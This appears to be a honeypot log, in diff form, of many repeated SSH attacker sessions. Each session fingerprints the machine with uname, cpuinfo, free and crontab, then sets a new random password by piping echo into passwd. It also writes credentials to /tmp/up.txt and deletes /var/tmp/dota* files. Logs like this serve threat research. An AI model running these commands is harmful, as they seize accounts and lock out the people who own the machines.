+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 1q2w3e4r" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: ad132712a442
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "7ujMko0admin\n8AU71fiOG0QJ\n8AU71fiOG0QJ"|passwd|bash
+echo "7ujMko0admin\n8AU71fiOG0QJ\n8AU71fiOG0QJ\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 7ujMko0admin" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 7401ebc278c3
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "1q2w3e4r\nm0H55QHra9cD\nm0H55QHra9cD"|passwd|bash
+echo "1q2w3e4r\nm0H55QHra9cD\nm0H55QHra9cD\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 1q2w3e4r" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 11701ddc374a
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "admin2019\n9UT4Uot39vxH\n9UT4Uot39vxH"|passwd|bash
+echo "admin2019\n9UT4Uot39vxH\n9UT4Uot39vxH\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin admin2019" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 821767318eaa
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "Password1\nAhjeJDQdFL4S\nAhjeJDQdFL4S"|passwd|bash
+echo "Password1\nAhjeJDQdFL4S\nAhjeJDQdFL4S\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin Password1" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 5c353ee1edc3
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "administrador\n3uqEKcYykEE2\n3uqEKcYykEE2"|passwd|bash
+echo "administrador\n3uqEKcYykEE2\n3uqEKcYykEE2\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin administrador" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: bdbb96cf41bb
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "admin123456\nQ8SH5OMqGtJd\nQ8SH5OMqGtJd"|passwd|bash
+echo "admin123456\nQ8SH5OMqGtJd\nQ8SH5OMqGtJd\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin admin123456" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 120e15ba819d
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "p@ssword\nUSjOsChMKXai\nUSjOsChMKXai"|passwd|bash
+echo "p@ssword\nUSjOsChMKXai\nUSjOsChMKXai\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin p@ssword" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: a60c37e4abf3
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "admin1234\nb505zmoJgQkI\nb505zmoJgQkI"|passwd|bash
+echo "admin1234\nb505zmoJgQkI\nb505zmoJgQkI\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin admin1234" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 776368240d96
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "q1w2e3r4t5y6\nUORwLsnj8hMi\nUORwLsnj8hMi"|passwd|bash
+echo "q1w2e3r4t5y6\nUORwLsnj8hMi\nUORwLsnj8hMi\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin q1w2e3r4t5y6" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 03a118010fc2
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "test123\nMJEaueJ45W1t\nMJEaueJ45W1t"|passwd|bash
+echo "test123\nMJEaueJ45W1t\nMJEaueJ45W1t\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin test123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: f3338b35824f
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "1234567\n05GGnM5Bbukg\n05GGnM5Bbukg"|passwd|bash
+echo "1234567\n05GGnM5Bbukg\n05GGnM5Bbukg\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 1234567" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 0aec4835734b
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "guest\nCkmVwj8kQ5Uj\nCkmVwj8kQ5Uj"|passwd|bash
+echo "guest\nCkmVwj8kQ5Uj\nCkmVwj8kQ5Uj\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin guest" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: fb5d2fbe9ce4
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "p@55w0rd\noHTDcqvJMcYG\noHTDcqvJMcYG"|passwd|bash
+echo "p@55w0rd\noHTDcqvJMcYG\noHTDcqvJMcYG\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin p@55w0rd" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 41d2b66d143d
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "p@55w0rd\noHTDcqvJMcYG\noHTDcqvJMcYG"|passwd|bash
+echo "p@55w0rd\noHTDcqvJMcYG\noHTDcqvJMcYG\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin p@55w0rd" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: f20a87e61384
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "1q2w3e4r\nLtV15UlH3MFy\nLtV15UlH3MFy"|passwd|bash
+echo "1q2w3e4r\nLtV15UlH3MFy\nLtV15UlH3MFy\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 1q2w3e4r" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: b204e324114f
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "admin@123\nE0RVW68Ayq0D\nE0RVW68Ayq0D"|passwd|bash
+echo "admin@123\nE0RVW68Ayq0D\nE0RVW68Ayq0D\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin admin@123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 42f435788862
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "7ujMko0admin\n0H1godQXbRWZ\n0H1godQXbRWZ"|passwd|bash
+echo "7ujMko0admin\n0H1godQXbRWZ\n0H1godQXbRWZ\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 7ujMko0admin" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 26de3bcacc2b
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "p@55w0rd\noHTDcqvJMcYG\noHTDcqvJMcYG"|passwd|bash
+echo "p@55w0rd\noHTDcqvJMcYG\noHTDcqvJMcYG\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin p@55w0rd" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: f360d791dc52
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "Password\nE0RVW68Ayq0D\nE0RVW68Ayq0D"|passwd|bash
+echo "Password\nE0RVW68Ayq0D\nE0RVW68Ayq0D\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin Password" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 6bf7a55f1a35
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "Password123\n8kjeeeGOwvMk\n8kjeeeGOwvMk"|passwd|bash
+echo "Password123\n8kjeeeGOwvMk\n8kjeeeGOwvMk\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin Password123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 25358b692ee4
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "admin1234\nXKnjE0FojWFO\nXKnjE0FojWFO"|passwd|bash
+echo "admin1234\nXKnjE0FojWFO\nXKnjE0FojWFO\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin admin1234" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 889b5aaf396c
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "123123\naKBMUL0A1APT\naKBMUL0A1APT"|passwd|bash
+echo "123123\naKBMUL0A1APT\naKBMUL0A1APT\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 123123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: f6d2ab9c5a60
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "1q2w3e4r5t6y\nWT7DcfeWREVm\nWT7DcfeWREVm"|passwd|bash
+echo "1q2w3e4r5t6y\nWT7DcfeWREVm\nWT7DcfeWREVm\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 1q2w3e4r5t6y" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: c52043b78e18
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "guest\ngN75H4iIHgH9\ngN75H4iIHgH9"|passwd|bash
+echo "guest\ngN75H4iIHgH9\ngN75H4iIHgH9\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin guest" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 4e17fd78098b
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "12345678\nTcJbwUgMtyKD\nTcJbwUgMtyKD"|passwd|bash
+echo "12345678\nTcJbwUgMtyKD\nTcJbwUgMtyKD\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 12345678" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 524d290b77d8
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "123123\n1gWqmQbsaGGa\n1gWqmQbsaGGa"|passwd|bash
+echo "123123\n1gWqmQbsaGGa\n1gWqmQbsaGGa\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 123123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 5aed8f34f77c
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "a1b2c3d4\njybc2eajQ8SN\njybc2eajQ8SN"|passwd|bash
+echo "a1b2c3d4\njybc2eajQ8SN\njybc2eajQ8SN\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin a1b2c3d4" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: fa8203a1b598
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "abcd\ndWRbhcDavBBz\ndWRbhcDavBBz"|passwd|bash
+echo "abcd\ndWRbhcDavBBz\ndWRbhcDavBBz\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin abcd" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: daa00589f5e0
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "1111111\nYexXclfTBJVO\nYexXclfTBJVO"|passwd|bash
+echo "1111111\nYexXclfTBJVO\nYexXclfTBJVO\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 1111111" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: e43cefb753ac
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "Password1\nFqpLrsYPuDXz\nFqpLrsYPuDXz"|passwd|bash
+echo "Password1\nFqpLrsYPuDXz\nFqpLrsYPuDXz\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin Password1" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 227a6c977133
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "1234\nNtWaQQzvA09C\nNtWaQQzvA09C"|passwd|bash
+echo "1234\nNtWaQQzvA09C\nNtWaQQzvA09C\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 1234" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 8541f9370f00
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "123qwe\nla0iDAKkLYmT\nla0iDAKkLYmT"|passwd|bash
+echo "123qwe\nla0iDAKkLYmT\nla0iDAKkLYmT\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 123qwe" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 4c54d32e49f4
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "qmfltmqjs!@#$\nWZgwiT1AwzCT\nWZgwiT1AwzCT"|passwd|bash
+echo "qmfltmqjs!@#$\nWZgwiT1AwzCT\nWZgwiT1AwzCT\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin qmfltmqjs!@#$" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: a2ff1c337785
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "password\n6xNpwfUYuLhU\n6xNpwfUYuLhU"|passwd|bash
+echo "password\n6xNpwfUYuLhU\n6xNpwfUYuLhU\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin password" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 9d099299b834
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "default\nZuBNDFGLY7pK\nZuBNDFGLY7pK"|passwd|bash
+echo "default\nZuBNDFGLY7pK\nZuBNDFGLY7pK\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin default" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: ef401c9ddd1b
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "access\nIZONSx5lqTZe\nIZONSx5lqTZe"|passwd|bash
+echo "access\nIZONSx5lqTZe\nIZONSx5lqTZe\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin access" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: ea8a694ec177
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "qwe123\n7Ph0GsW0papM\n7Ph0GsW0papM"|passwd|bash
+echo "qwe123\n7Ph0GsW0papM\n7Ph0GsW0papM\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
